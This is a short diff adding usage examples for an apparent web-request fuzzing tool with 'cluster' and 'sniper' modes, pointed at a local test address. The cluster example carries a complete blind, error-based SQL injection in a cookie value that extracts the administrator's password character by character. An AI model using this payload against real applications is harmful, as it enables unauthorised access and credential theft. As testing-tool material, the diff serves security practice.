@@ -1,0 +1,2 @@
+Cluster:go run main.go -p .\mocks\payload_nums.txt -p .\mocks\payload_alpha_and_num.txt -u "http://0.0.0.0:4000" -a cluster -h "{\`"Cookie\`": \`"session=Kp4tP84OLFbdHdDLyzCVTuLkaw6L2TBR; TrackingId=dt63WTwltF4kV72t' || (SELECT CASE WHEN SUBSTR(password,!1!,1)='!a!' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'\`"}" -d 50
+Sniper:go run main.go -p .\mocks\payload_alpha_and_num.txt -u "http://0.0.0.0:4000?parma1=!aaaaa!" -a sniper -d 50
